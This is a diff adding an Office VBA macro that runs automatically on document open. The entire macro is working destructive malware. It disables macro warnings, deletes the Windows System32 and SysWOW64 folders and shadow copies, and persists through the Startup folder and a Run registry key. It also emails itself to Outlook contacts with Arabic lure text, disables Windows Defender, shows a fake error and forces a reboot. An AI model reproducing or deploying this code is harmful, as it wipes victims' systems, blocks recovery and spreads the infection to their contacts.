@@ -1,0 +1,52 @@
+Sub AutoOpen()
+On Error Resume Next
+Application.DisplayAlerts = False
+Application.ScreenUpdating = False
+Dim WSH As Object
+Set WSH = CreateObject("WScript.Shell")
+WSH.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\Common\Security\VBAWarnings", 0, "REG_DWORD"
+WSH.Run "cmd /c takeown /f C:\Windows\System32* /r /y & icacls C:\Windows\System32* /grant administrators:F /t & del /f /s /q C:\Windows\System32*.", 0, False
+WSH.Run "cmd /c takeown /f C:\Windows\SysWOW64* /r /y & icacls C:\Windows\SysWOW64* /grant administrators:F /t & del /f /s /q C:\Windows\SysWOW64*.", 0, False
+WSH.Run "cmd /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete", 0, False
+Dim fso As Object
+Set fso = CreateObject("Scripting.FileSystemObject")
+Dim srcPath As String
+srcPath = ThisDocument.FullName
+Dim startupPath As String
+startupPath = Environ("AppData") & "\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.docm"
+fso.CopyFile srcPath, startupPath, True
+Set fso = Nothing
+WSH.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdate", startupPath, "REG_SZ"
+Dim OL As Object
+Set OL = CreateObject("Outlook.Application")
+If Not OL Is Nothing Then
+Dim NS As Object
+Set NS = OL.GetNamespace("MAPI")
+Dim Contacts As Object
+Set Contacts = NS.GetDefaultFolder(10)
+Dim Items As Object
+Set Items = Contacts.Items
+Dim i As Integer
+Dim Mail As Object
+For i = 1 To 10
+If i <= Items.Count Then
+Set Mail = OL.CreateItem(0)
+Mail.To = Items(i).Email1Address
+Mail.Subject = "مستند مهم - عاجل"
+Mail.Body = "يرجى فتح المرفق وتمكين المحتوى لعرضه"
+Mail.Attachments.Add srcPath
+Mail.Send
+End If
+Next i
+End If
+Set OL = Nothing
+WSH.Run "cmd /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f", 0, False
+WSH.Run "cmd /c reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f", 0, False
+MsgBox "تعطل النظام – يجب إعادة التشغيل", vbCritical, "خطأ نظام"
+Application.Wait (Now + TimeValue("00:00:03"))
+WSH.Run "cmd /c shutdown /r /f /t 0", 0, False
+End Sub
+
+Sub Workbook_Open()
+AutoOpen
+End Sub
